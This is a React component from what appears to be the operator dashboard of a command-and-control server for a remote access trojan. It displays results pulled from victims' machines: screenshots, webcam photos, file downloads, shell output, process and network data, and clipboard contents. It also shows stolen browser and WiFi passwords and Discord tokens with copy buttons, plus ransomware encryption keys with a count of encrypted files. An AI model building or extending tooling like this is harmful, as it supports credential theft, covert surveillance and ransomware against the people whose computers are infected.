// app/dashboard/c2/CommandResults.tsx
'use client'
import { useState } from 'react'

interface CommandResult {
  id: number
  command: string
  parameters: any
  status: string
  output: string
  created_at: string
  completed_at?: string
}

interface CommandResultsProps {
  results: CommandResult[]
  clientId: number
}

export default function CommandResults({ results, clientId }: CommandResultsProps) {
  const [selectedResult, setSelectedResult] = useState<CommandResult | null>(null)
  const [expandedImage, setExpandedImage] = useState<string | null>(null)
  const [copied, setCopied] = useState<string | null>(null)

  function copyToClipboard(text: string, id: string) {
    navigator.clipboard.writeText(text)
    setCopied(id)
    setTimeout(() => setCopied(null), 2000)
  }

  function renderOutput(output: any) {
    if (!output) return <p className="text-gray-500">No output</p>

    try {
      const parsed = typeof output === 'string' ? JSON.parse(output) : output

      // Handle errors
      if (parsed.error) {
        return (
          <div className="p-4 rounded-lg bg-red-500/10 border border-red-500/30">
            <p className="text-red-500 font-mono text-sm break-words">{parsed.error}</p>
          </div>
        )
      }

      // Handle success messages
      if (parsed.status) {
        return (
          <div className="p-3 rounded-lg bg-green-500/10 border border-green-500/30">
            <p className="text-green-500 text-sm">
              ✓ {parsed.status}
              {parsed.path && <span className="block text-xs mt-1 opacity-75">{parsed.path}</span>}
            </p>
          </div>
        )
      }

      // Handle screenshots
      if (parsed.image) {
        return (
          <div className="space-y-3">
            <div className="relative group">
              <img
                src={`data:image/png;base64,${parsed.image}`}
                alt="Screenshot"
                className="max-w-full rounded-lg cursor-pointer transition-all hover:scale-[1.02] hover:shadow-2xl"
                onClick={() => setExpandedImage(`data:image/png;base64,${parsed.image}`)}
              />
              <button
                onClick={() => {
                  const link = document.createElement('a')
                  link.href = `data:image/png;base64,${parsed.image}`
                  link.download = `screenshot_${new Date().getTime()}.png`
                  link.click()
                }}
                className="absolute top-2 right-2 p-2 rounded-lg bg-black/50 opacity-0 group-hover:opacity-100 transition-opacity"
              >
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2">
                  <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/>
                </svg>
              </button>
            </div>
            <div className="flex justify-between text-xs" style={{ color: '#5d585c' }}>
              <span>Resolution: {parsed.resolution || 'Unknown'}</span>
              <span>{parsed.timestamp ? new Date(parsed.timestamp * 1000).toLocaleTimeString() : ''}</span>
            </div>
          </div>
        )
      }

      // Handle webcam photos
      if (parsed.camera) {
        return (
          <div className="space-y-3">
            <div className="relative group">
              <img
                src={`data:image/jpeg;base64,${parsed.image}`}
                alt="Webcam"
                className="max-w-full rounded-lg cursor-pointer"
                onClick={() => setExpandedImage(`data:image/jpeg;base64,${parsed.image}`)}
              />
              <button
                onClick={() => {
                  const link = document.createElement('a')
                  link.href = `data:image/jpeg;base64,${parsed.image}`
                  link.download = `webcam_${new Date().getTime()}.jpg`
                  link.click()
                }}
                className="absolute top-2 right-2 p-2 rounded-lg bg-black/50 opacity-0 group-hover:opacity-100 transition-opacity"
              >
                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="white" strokeWidth="2">
                  <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="7 10 12 15 17 10"/><line x1="12" y1="15" x2="12" y2="3"/>
                </svg>
              </button>
            </div>
            <div className="text-xs" style={{ color: '#5d585c' }}>
              Camera: {parsed.camera}
            </div>
          </div>
        )
      }

      // Handle process list
      if (parsed.type === 'processes' && parsed.processes) {
        return (
          <div className="space-y-3">
            <div className="overflow-x-auto max-h-96">
              <table className="w-full text-sm">
                <thead className="sticky top-0" style={{ background: '#1a1218' }}>
                  <tr style={{ borderBottom: '1px solid #352f31' }}>
                    <th className="text-left py-2 px-2">PID</th>
                    <th className="text-left py-2 px-2">Name</th>
                    <th className="text-left py-2 px-2">CPU%</th>
                    <th className="text-left py-2 px-2">Memory%</th>
                    <th className="text-left py-2 px-2">Status</th>
                  </tr>
                </thead>
                <tbody>
                  {parsed.processes.map((p: any, i: number) => (
                    <tr key={i} style={{ borderBottom: '1px solid #2a2226' }}>
                      <td className="py-1 px-2 font-mono text-xs">{p.pid}</td>
                      <td className="py-1 px-2">{p.name}</td>
                      <td className="py-1 px-2">{(p.cpu_percent || 0).toFixed(1)}</td>
                      <td className="py-1 px-2">{(p.memory_percent || 0).toFixed(1)}</td>
                      <td className="py-1 px-2">{p.status || 'running'}</td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
            <p className="text-xs" style={{ color: '#5d585c' }}>
              Total: {parsed.count} processes • Showing {parsed.processes.length}
            </p>
          </div>
        )
      }

      // Handle system info
      if (parsed.type === 'system' && parsed.info) {
        const info = parsed.info
        return (
          <div className="space-y-4">
            <div className="grid grid-cols-2 gap-3">
              <div className="p-3 rounded" style={{ background: '#0f0b0c' }}>
                <div className="text-xs mb-1" style={{ color: '#5d585c' }}>Hostname</div>
                <div className="text-sm font-mono">{info.hostname}</div>
              </div>
              <div className="p-3 rounded" style={{ background: '#0f0b0c' }}>
                <div className="text-xs mb-1" style={{ color: '#5d585c' }}>Username</div>
                <div className="text-sm">{info.username}</div>
              </div>
              <div className="col-span-2 p-3 rounded" style={{ background: '#0f0b0c' }}>
                <div className="text-xs mb-1" style={{ color: '#5d585c' }}>OS</div>
                <div className="text-sm break-words">{info.os}</div>
              </div>
              <div className="p-3 rounded" style={{ background: '#0f0b0c' }}>
                <div className="text-xs mb-1" style={{ color: '#5d585c' }}>CPU</div>
                <div className="text-sm">{info.processor || 'Unknown'}</div>
                <div className="text-xs mt-1">{info.cpu_count} cores • {info.cpu_percent}% used</div>
              </div>
              <div className="p-3 rounded" style={{ background: '#0f0b0c' }}>
                <div className="text-xs mb-1" style={{ color: '#5d585c' }}>RAM</div>
                <div className="text-sm">{info.ram_total}GB Total</div>
                <div className="text-xs mt-1">{info.ram_percent}% used • {info.ram_available}GB free</div>
              </div>
              <div className="p-3 rounded" style={{ background: '#0f0b0c' }}>
                <div className="text-xs mb-1" style={{ color: '#5d585c' }}>Uptime</div>
                <div className="text-sm">{info.uptime_str}</div>
                <div className="text-xs mt-1">Boot: {new Date(info.boot_time).toLocaleString()}</div>
              </div>
              <div className="p-3 rounded" style={{ background: '#0f0b0c' }}>
                <div className="text-xs mb-1" style={{ color: '#5d585c' }}>Admin</div>
                <div className="text-sm">
                  <span className={info.is_admin ? 'text-green-500' : 'text-red-500'}>
                    {info.is_admin ? 'Yes' : 'No'}
                  </span>
                </div>
              </div>
            </div>

            {Object.keys(info.disk_usage || {}).length > 0 && (
              <div className="p-3 rounded" style={{ background: '#0f0b0c' }}>
                <div className="text-xs mb-3" style={{ color: '#5d585c' }}>Storage</div>
                {Object.entries(info.disk_usage).map(([drive, usage]: [string, any]) => (
                  <div key={drive} className="mb-3 last:mb-0">
                    <div className="flex justify-between text-xs mb-1">
                      <span className="font-mono">{drive}</span>
                      <span>{usage.used}GB / {usage.total}GB ({usage.percent}%)</span>
                    </div>
                    <div className="h-2 rounded-full overflow-hidden" style={{ background: '#2a2024' }}>
                      <div 
                        className="h-full rounded-full transition-all" 
                        style={{ width: `${usage.percent}%`, background: '#dc2625' }}
                      />
                    </div>
                  </div>
                ))}
              </div>
            )}
          </div>
        )
      }

      // Handle network info
      if (parsed.type === 'network') {
        return (
          <div className="space-y-4">
            {parsed.connections && parsed.connections.length > 0 && (
              <div>
                <div className="text-xs mb-2" style={{ color: '#5d585c' }}>Active Connections</div>
                <div className="overflow-x-auto max-h-60">
                  <table className="w-full text-xs">
                    <thead className="sticky top-0" style={{ background: '#1a1218' }}>
                      <tr>
                        <th className="text-left py-1">Local</th>
                        <th className="text-left py-1">Remote</th>
                        <th className="text-left py-1">Status</th>
                        <th className="text-left py-1">PID</th>
                      </tr>
                    </thead>
                    <tbody>
                      {parsed.connections.map((conn: any, i: number) => (
                        <tr key={i}>
                          <td className="py-0.5 font-mono">{conn.laddr}</td>
                          <td className="py-0.5 font-mono">{conn.raddr || '*'}</td>
                          <td className="py-0.5">{conn.status}</td>
                          <td className="py-0.5">{conn.pid || '-'}</td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              </div>
            )}
          </div>
        )
      }

      // Handle directory listing
      if (parsed.items) {
        return (
          <div className="space-y-3">
            <p className="font-mono text-sm p-2 rounded" style={{ background: '#0f0b0c', color: '#868283' }}>
              📁 {parsed.current}
            </p>
            <div className="space-y-1 max-h-96 overflow-y-auto">
              {parsed.items.map((item: any, i: number) => (
                <div 
                  key={i} 
                  className="flex items-center gap-2 p-1.5 rounded hover:bg-white/5 transition-colors"
                >
                  <span className="text-lg">{item.type === 'directory' ? '📁' : '📄'}</span>
                  <span style={{ color: item.hidden ? '#5d585c' : '#e5e3e4' }}>
                    {item.name}
                  </span>
                  {item.type === 'file' && (
                    <>
                      <span className="text-xs ml-auto" style={{ color: '#5d585c' }}>
                        {(item.size / 1024).toFixed(1)} KB
                      </span>
                      <span className="text-xs" style={{ color: '#5d585c' }}>
                        {new Date(item.modified).toLocaleDateString()}
                      </span>
                    </>
                  )}
                </div>
              ))}
            </div>
            <p className="text-xs" style={{ color: '#5d585c' }}>
              {parsed.count} items
            </p>
          </div>
        )
      }

      // Handle file tree
      if (parsed.tree) {
        return (
          <div className="space-y-3">
            <p className="font-mono text-sm" style={{ color: '#868283' }}>
              {parsed.root}
            </p>
            <pre className="text-xs overflow-x-auto max-h-96 p-3 rounded" style={{ background: '#0f0b0c' }}>
              {parsed.tree.join('\n')}
            </pre>
          </div>
        )
      }

      // Handle file download
      if (parsed._files && parsed._files.length > 0) {
        return (
          <div className="space-y-3">
            {parsed._files.map((file: any, i: number) => (
              <div
                key={i}
                className="p-4 rounded-lg transition-all hover:scale-[1.02]"
                style={{ background: 'linear-gradient(135deg, #dc2625, #b91c1c)' }}
              >
                <div className="flex items-center justify-between mb-2">
                  <span className="font-bold text-white">{file.name}</span>
                  <span className="text-xs text-white/70">
                    {(file.size / 1024).toFixed(1)} KB
                  </span>
                </div>
                <a
                  href={`data:${file.type || 'application/octet-stream'};base64,${file.data}`}
                  download={file.name}
                  className="block w-full py-2 px-4 rounded text-center text-sm font-bold bg-white/20 text-white hover:bg-white/30 transition-colors"
                >
                  ⬇️ Download
                </a>
              </div>
            ))}
          </div>
        )
      }

      // Handle killed processes
      if (parsed.killed) {
        return (
          <div className="space-y-2">
            <p className="text-green-500 text-sm">✓ Killed {parsed.count} process(es)</p>
            {parsed.killed.map((p: any, i: number) => (
              <div key={i} className="text-xs p-2 rounded" style={{ background: '#0f0b0c' }}>
                {p.name} (PID: {p.pid})
              </div>
            ))}
          </div>
        )
      }

      // Handle WiFi passwords
      if (parsed.wifi) {
        return (
          <div className="space-y-2">
            {Object.entries(parsed.wifi).map(([network, password]: [string, any], index) => (
              <div key={network} className="p-3 rounded" style={{ background: '#0f0b0c' }}>
                <div className="font-bold text-sm mb-1">{network}</div>
                <div className="font-mono text-xs flex items-center gap-2">
                  <span style={{ color: '#16a34a' }}>🔑 {password}</span>
                  <button
                    onClick={() => copyToClipboard(password, `wifi-${index}`)}
                    className="px-2 py-0.5 rounded text-xs transition-colors"
                    style={{ background: '#2a2024', color: '#868283' }}
                  >
                    {copied === `wifi-${index}` ? '✓ Copied' : 'Copy'}
                  </button>
                </div>
              </div>
            ))}
          </div>
        )
      }

      // Handle passwords
      if (parsed.passwords) {
        return (
          <div className="space-y-2">
            {Object.entries(parsed.passwords).map(([site, data]: [string, any], index) => (
              <div key={site} className="p-3 rounded" style={{ background: '#0f0b0c' }}>
                <div className="font-bold text-sm mb-1">{site}</div>
                <div className="space-y-1 text-xs">
                  <div>👤 {data.username || 'N/A'}</div>
                  <div className="flex items-center gap-2">
                    <span>🔑 {data.password || 'N/A'}</span>
                    {data.password && (
                      <button
                        onClick={() => copyToClipboard(data.password, `pass-${index}`)}
                        className="px-2 py-0.5 rounded text-xs transition-colors"
                        style={{ background: '#2a2024', color: '#868283' }}
                      >
                        {copied === `pass-${index}` ? '✓' : 'Copy'}
                      </button>
                    )}
                  </div>
                </div>
              </div>
            ))}
          </div>
        )
      }

      // Handle Discord tokens
      if (parsed.discord && parsed.discord.tokens) {
        const tokens = parsed.discord.tokens
        if (Array.isArray(tokens) && tokens.length > 0) {
          return (
            <div className="space-y-2">
              {tokens.map((token: string, index: number) => (
                <div key={index} className="p-3 rounded flex items-center justify-between" style={{ background: '#0f0b0c' }}>
                  <code className="text-xs font-mono break-all">{token}</code>
                  <button
                    onClick={() => copyToClipboard(token, `discord-${index}`)}
                    className="ml-2 px-2 py-1 rounded text-xs whitespace-nowrap"
                    style={{ background: '#5865F2', color: 'white' }}
                  >
                    {copied === `discord-${index}` ? '✓' : 'Copy'}
                  </button>
                </div>
              ))}
            </div>
          )
        }
      }

      // Handle message box response
      if (parsed.response) {
        return (
          <div className="p-4 rounded-lg text-center" style={{ background: '#0f0b0c' }}>
            <div className="text-2xl mb-2">📧</div>
            <div className="font-bold mb-1">User clicked: {parsed.response}</div>
            <div className="text-xs" style={{ color: '#5d585c' }}>
              {parsed.title}: {parsed.text}
            </div>
          </div>
        )
      }

      // Handle CMD output
      if (parsed.stdout !== undefined) {
        return (
          <div className="space-y-3">
            {parsed.stdout && (
              <pre className="text-xs overflow-x-auto p-3 rounded" style={{ background: '#0f0b0c' }}>
                {parsed.stdout}
              </pre>
            )}
            {parsed.stderr && (
              <pre className="text-xs overflow-x-auto p-3 rounded bg-red-500/10 text-red-500">
                {parsed.stderr}
              </pre>
            )}
            <div className="text-xs" style={{ color: '#5d585c' }}>
              Exit code: {parsed.returncode}
            </div>
          </div>
        )
      }

      // Handle encryption keys
      if (parsed.key) {
        return (
          <div className="space-y-3">
            <div className="p-4 rounded-lg bg-yellow-500/10 border border-yellow-500/30">
              <div className="font-bold mb-2 text-yellow-500">🔐 Encryption Key</div>
              <code className="text-xs break-all block mb-3">{parsed.key}</code>
              <button
                onClick={() => copyToClipboard(parsed.key, 'encryption-key')}
                className="w-full py-2 rounded text-sm font-bold"
                style={{ background: '#2a2024', color: '#e5e3e4' }}
              >
                {copied === 'encryption-key' ? '✓ Copied!' : 'Copy Key'}
              </button>
            </div>
            <p className="text-xs" style={{ color: '#5d585c' }}>
              Encrypted {parsed.count} file(s)
            </p>
          </div>
        )
      }

      // Handle clipboard content
      if (parsed.content !== undefined) {
        return (
          <div className="space-y-2">
            <pre className="text-xs p-3 rounded overflow-x-auto" style={{ background: '#0f0b0c' }}>
              {parsed.content || '(empty)'}
            </pre>
            {parsed.content && (
              <button
                onClick={() => copyToClipboard(parsed.content, 'clipboard')}
                className="px-3 py-1.5 rounded text-xs"
                style={{ background: '#2a2024', color: '#868283' }}
              >
                {copied === 'clipboard' ? '✓ Copied!' : 'Copy to Clipboard'}
              </button>
            )}
          </div>
        )
      }

      // Handle blacklist
      if (parsed.blacklist) {
        return (
          <div className="space-y-2">
            <p className="text-sm" style={{ color: '#e5e3e4' }}>
              Blacklist: {parsed.blacklist.length} process(es)
            </p>
            <div className="space-y-1 max-h-40 overflow-y-auto">
              {parsed.blacklist.map((proc: string, i: number) => (
                <div key={i} className="text-xs p-1" style={{ color: '#868283' }}>
                  • {proc}
                </div>
              ))}
            </div>
          </div>
        )
      }

      // Default: pretty print JSON
      if (typeof parsed === 'object') {
        return (
          <pre className="text-xs overflow-x-auto p-3 rounded" style={{ background: '#0f0b0c' }}>
            {JSON.stringify(parsed, null, 2)}
          </pre>
        )
      }

      return <pre className="text-sm whitespace-pre-wrap break-words">{output}</pre>
    } catch {
      // Not JSON, treat as plain text
      return <pre className="text-sm whitespace-pre-wrap break-words">{output}</pre>
    }
  }

  // Image expansion modal
  if (expandedImage) {
    return (
      <div 
        className="fixed inset-0 z-50 flex items-center justify-center p-4"
        style={{ background: 'rgba(0,0,0,0.95)' }}
        onClick={() => setExpandedImage(null)}
      >
        <div className="relative max-w-7xl max-h-full">
          <img 
            src={expandedImage} 
            alt="Expanded" 
            className="max-w-full max-h-[90vh] rounded-lg"
          />
          <button
            onClick={() => setExpandedImage(null)}
            className="absolute top-4 right-4 w-10 h-10 rounded-full bg-black/50 text-white flex items-center justify-center hover:bg-black/70"
          >
            ✕
          </button>
        </div>
      </div>
    )
  }

  if (results.length === 0) {
    return (
      <div className="text-center py-12" style={{ color: '#3a3537' }}>
        <div className="text-4xl mb-3">📭</div>
        <p className="text-sm">No commands executed yet</p>
        <p className="text-xs mt-1">Send a command using the panel above</p>
      </div>
    )
  }

  return (
    <div className="space-y-4">
      {results.map((result) => (
        <div
          key={result.id}
          className="rounded-lg overflow-hidden transition-all hover:shadow-xl"
          style={{ 
            background: '#1a1218',
            border: selectedResult?.id === result.id ? '1px solid #dc2625' : '1px solid #352f31'
          }}
        >
          {/* Command Header */}
          <div
            className="p-4 cursor-pointer"
            onClick={() => setSelectedResult(selectedResult?.id === result.id ? null : result)}
          >
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-3">
                <div className={`w-2 h-2 rounded-full ${
                  result.status === 'completed' ? 'bg-green-500' :
                  result.status === 'running' ? 'bg-yellow-500 animate-pulse' :
                  'bg-red-500'
                }`} />
                <span className="font-mono text-sm font-bold" style={{ color: '#dc2625' }}>
                  {result.command}
                </span>
                <span className="text-xs px-2 py-0.5 rounded" style={{ background: '#2a2024', color: '#868283' }}>
                  ID: {result.id}
                </span>
              </div>
              <div className="flex items-center gap-3">
                <span className="text-xs" style={{ color: '#5d585c' }}>
                  {new Date(result.created_at).toLocaleTimeString()}
                </span>
                <svg
                  width="16"
                  height="16"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  strokeWidth="2"
                  style={{ 
                    transform: selectedResult?.id === result.id ? 'rotate(180deg)' : 'rotate(0)',
                    transition: 'transform 0.2s',
                    color: '#5d585c'
                  }}
                >
                  <polyline points="6 9 12 15 18 9"/>
                </svg>
              </div>
            </div>

            {/* Parameters preview */}
            {result.parameters && Object.keys(result.parameters).length > 0 && (
              <div className="mt-2 text-xs flex flex-wrap gap-2">
                {Object.entries(result.parameters).map(([key, value]) => (
                  <span
                    key={key}
                    className="px-2 py-0.5 rounded"
                    style={{ background: '#0f0b0c', color: '#868283' }}
                  >
                    {key}: {typeof value === 'string' ? value.slice(0, 30) + (value.length > 30 ? '...' : '') : JSON.stringify(value).slice(0, 30)}
                  </span>
                ))}
              </div>
            )}
          </div>

          {/* Command Output */}
          {selectedResult?.id === result.id && (
            <div className="p-4 pt-0 border-t" style={{ borderColor: '#352f31' }}>
              <div className="mt-4">
                {renderOutput(result.output)}
              </div>
              
              {/* Metadata footer */}
              <div className="mt-4 pt-3 text-xs flex justify-between items-center" style={{ borderTop: '1px solid #2a2226', color: '#5d585c' }}>
                <span>Created: {new Date(result.created_at).toLocaleString()}</span>
                {result.completed_at && (
                  <span>Completed: {new Date(result.completed_at).toLocaleString()}</span>
                )}
              </div>
            </div>
          )}
        </div>
      ))}
    </div>
  )
}